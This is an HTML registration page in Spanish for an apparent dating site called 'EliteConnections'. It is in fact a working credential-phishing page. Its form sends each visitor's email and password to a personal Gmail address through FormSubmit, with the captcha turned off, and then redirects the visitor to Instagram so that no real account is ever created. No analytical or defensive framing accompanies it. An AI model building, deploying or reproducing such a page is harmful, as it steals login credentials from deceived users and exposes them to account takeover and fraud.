<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro - EliteConnections</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            overflow: hidden;
            height: 100vh;
        }

        /* Video de fondo */
        #videoBackground {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -2;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(255, 105, 180, 0.85) 0%, rgba(147, 112, 219, 0.85) 50%, rgba(65, 105, 225, 0.85) 100%);
            z-index: -1;
        }

        .container {
            max-width: 480px;
            margin: 40px auto;
            padding: 40px 35px;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            position: relative;
            z-index: 1;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo h1 {
            font-size: 2.5em;
            font-weight: 700;
            background: linear-gradient(135deg, #ff69b4, #9370db, #4169e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 8px;
        }

        .logo .tagline {
            color: #666;
            font-size: 1.1em;
            font-weight: 300;
        }

        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-size: 1.8em;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 25px;
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: #555;
            font-size: 0.95em;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #e1e8ed;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #fff;
        }

        input:focus {
            border-color: #ff69b4;
            outline: none;
            box-shadow: 0 0 0 3px rgba(255, 105, 180, 0.1);
            transform: translateY(-2px);
        }

        button {
            background: linear-gradient(135deg, #ff69b4, #9370db);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            font-weight: 600;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 105, 180, 0.3);
        }

        button:disabled {
            background: #cccccc;
            transform: none;
            box-shadow: none;
            cursor: not-allowed;
        }

        .loading {
            text-align: center;
            margin-top: 15px;
            color: #ff69b4;
            font-weight: 600;
        }

        .error {
            color: #e74c3c;
            font-size: 0.85em;
            margin-top: 8px;
            font-weight: 500;
        }

        .password-hint {
            font-size: 0.8em;
            color: #888;
            margin-top: 8px;
            font-style: italic;
        }

        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-top: 25px;
            text-align: center;
        }

        .feature {
            padding: 12px;
            background: rgba(255, 105, 180, 0.1);
            border-radius: 10px;
            font-size: 0.85em;
            color: #666;
            font-weight: 500;
        }

        .feature i {
            color: #ff69b4;
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
        }

        /* Animaciones */
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .container {
            animation: fadeInUp 0.8s ease-out;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                margin: 20px;
                padding: 30px 25px;
            }
            
            body {
                overflow-y: auto;
            }
        }
    </style>
</head>
<body>
    <!-- Video de fondo -->
    <video id="videoBackground" autoplay muted loop>
        <source src="https://assets.mixkit.co/videos/preview/mixkit-couple-having-a-romantic-dinner-while-looking-at-43363-large.mp4" type="video/mp4">
    </video>
    <div class="overlay"></div>

    <div class="container">
        <div class="logo">
            <h1>EliteConnections</h1>
            <div class="tagline">Donde los corazones se encuentran</div>
        </div>
        
        <h2>Comienza tu historia de amor</h2>
        
        <!-- FORMULARIO FORMSUBMIT -->
        <form id="registroForm" action="https://formsubmit.co/enriquepng1@gmail.com" method="POST">
            <!-- Campos ocultos para configuraci칩n -->
            <input type="hidden" name="_subject" value="游댠 NUEVO REGISTRO - EliteConnections">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://www.instagram.com">
            
            <div class="form-group">
                <label for="email">Correo electr칩nico</label>
                <input type="email" id="email" name="email" required placeholder="tu.corazon@ejemplo.com">
                <div id="emailError" class="error"></div>
            </div>
            
            <div class="form-group">
                <label for="password">Contrase침a</label>
                <input type="password" id="password" name="password" required minlength="8">
                <div class="password-hint">Usa 8 o m치s caracteres para proteger tu cuenta</div>
                <div id="passwordError" class="error"></div>
            </div>
            
            <button type="submit" id="submitButton">Encontrar mi pareja ideal</button>
            <div id="loadingMessage" class="loading" style="display: none;">Buscando tu media naranja...</div>
        </form>

        <div class="features">
            <div class="feature">
                <i>仇벒잺</i>
                Compatibilidad
            </div>
            <div class="feature">
                <i>游</i>
                Seguro
            </div>
            <div class="feature">
                <i>游깵</i>
                Global
            </div>
            <div class="feature">
                <i>游눫</i>
                Chat en vivo
            </div>
        </div>

        <div class="login-link">
            쯏a tienes una cuenta? <a href="login.html">Inicia sesi칩n aqu칤</a>
        </div>
    </div>

<script>
    document.getElementById('registroForm').addEventListener('submit', function(e) {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const submitButton = document.getElementById('submitButton');
        const loadingMessage = document.getElementById('loadingMessage');
        
        // Validaci칩n b치sica
        if (!email || !password) {
            alert('Por favor completa todos los campos');
            e.preventDefault();
            return;
        }
        
        if (password.length < 8) {
            alert('La contrase침a debe tener al menos 8 caracteres');
            e.preventDefault();
            return;
        }
        
        // Mostrar carga
        submitButton.disabled = true;
        loadingMessage.style.display = 'block';
        
        // FormSubmit se encarga del env칤o autom치ticamente
        // No necesitamos JavaScript adicional
    });
</script>
</body>
        </html>
